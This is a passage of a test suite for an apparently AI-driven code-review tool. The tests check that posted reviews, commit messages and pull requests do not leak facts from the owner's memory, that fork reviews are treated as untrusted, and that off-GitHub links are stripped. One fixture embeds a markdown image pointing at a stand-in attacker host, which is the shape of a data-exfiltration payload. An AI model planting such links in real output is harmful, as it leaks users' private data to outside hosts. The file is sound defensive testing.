    reset()
    answers.push(2)
    const body = `Found one issue. ${FACT}.`
    expect(await postWith(review, { body, event: "comment", head: HEAD })).toEqual({ posted: false, inline: 0 })
    expect(requests.some((request) => request.path.endsWith("/reviews"))).toBe(false)
    answers.push(1)
    await postWith(review, { body, event: "comment", head: HEAD })
    expect(requests.find((request) => request.path.endsWith("/reviews"))?.body?.body).toBe(body)
  })

  test("with the engine out of reach, nothing is posted unless the owner says to post anyway", async () => {
    reset()
    usePostingEngine(async () => ({ url: "http://127.0.0.1:9", username: "vector", password: "engine-secret" }))
    try {
      expect(await postWith(review, { body: "One finding", event: "comment", head: HEAD })).toEqual({
        posted: false,
        inline: 0,
      })
      expect(questions[0]?.message).toBe("Vector could not check this text against your memory. Post anyway?")
      expect(questions[0]?.default).toBe(1)
      expect(requests.some((request) => request.path.endsWith("/reviews"))).toBe(false)
      answers.push(0)
      expect(await postWith(review, { body: "One finding", event: "comment", head: HEAD })).toEqual({
        posted: true,
        inline: 0,
      })
    } finally {
      usePostingEngine(reachable)
    }
  })

  test("text the user typed, such as a commit message, is asked about and never changed", async () => {
    reset()
    const typed = [`Release prep. ${FACT}.`]
    expect(await checkPost({ cwd: "/repo", parts: typed, typed: true })).toBeUndefined()
    expect(questions[0]).toMatchObject({ buttons: ["Post as is", "Cancel"], default: 1 })
    answers.push(0)
    expect(await checkPost({ cwd: "/repo", parts: typed, typed: true })).toEqual(typed)
    expect(await checkPost({ cwd: "/repo", parts: ["Fix the retry loop"], typed: true })).toEqual([
      "Fix the retry loop",
    ])
    expect(questions).toHaveLength(2)
  })

  test("a Parallel Workspace pull request is checked before anything is committed: the typed task asked about, the summary cut", async () => {
    reset()
    const dir = await mkdtemp(join(tmpdir(), "vector-workspace-"))
    const pullRequest = {
      projectPath: dir,
      title: "Retry fix",
      body: `Fixed the retry loop. ${FACT}.`,
      task: `Ship it. ${HABIT}.`,
    }
    try {
      // The task is the user's own words: the check asks, and Cancel posts nothing.
      expect(await createPullRequest(pullRequest)).toEqual({ ok: false, log: "", error: "Nothing was posted." })
      expect(checks[0]?.body).toMatchObject({ parts: [`Ship it. ${HABIT}.`], typed: true })
      expect(questions[0]).toMatchObject({ buttons: ["Post as is", "Cancel"] })
      // Posting the task as is goes on to Vector's own title and summary, which lose what repeats the owner's memory.
      answers.push(0, 2)
      expect(await createPullRequest(pullRequest)).toEqual({ ok: false, log: "", error: "Nothing was posted." })
      expect(checks[2]?.body).toMatchObject({ parts: ["Retry fix", `Fixed the retry loop. ${FACT}.`], typed: false })
      expect(questions[2]).toMatchObject({ buttons: ["Post without it", "Post as is", "Cancel"] })
    } finally {
      await rm(dir, { recursive: true, force: true })
    }
  })

  test("a review of a fork's or another author's pull request is checked as untrusted, whatever the renderer said", async () => {
    reset()
    const said: boolean[] = []
    const trusting: ReviewCheck = (parts, untrusted) => (said.push(untrusted), Promise.resolve(parts))
    const post = () => postWith(trusting, { body: "One finding", event: "comment", head: HEAD })
    try {
      await post()
      live.headRepo = "stranger/app"
      await post()
      live.headRepo = "acme/app"
      live.author = "someone-else"
      await post()
      live.viewer = "someone-else"
      await post()
    } finally {
      Object.assign(live, { headRepo: "acme/app", author: "sam", viewer: "sam" })
    }
    expect(said).toEqual([false, true, true, false])
  })

  test("Post as is says it also puts back the links a fork's review lost", async () => {
    reset()
    answers.push(2)
    const body = `Found one issue. ${FACT}. See ![x](https://evil.example.net/a.png).`
    expect(await postWith(review, { body, event: "comment", head: HEAD })).toEqual({ posted: false, inline: 0 })
    // The fallback body repeats the body, and the sentence is shown once.
    expect(questions[0]?.detail).toBe(
      `• ${FACT}.\n\nPost as is also puts back the links and images that point off GitHub.`,
    )
  })
})
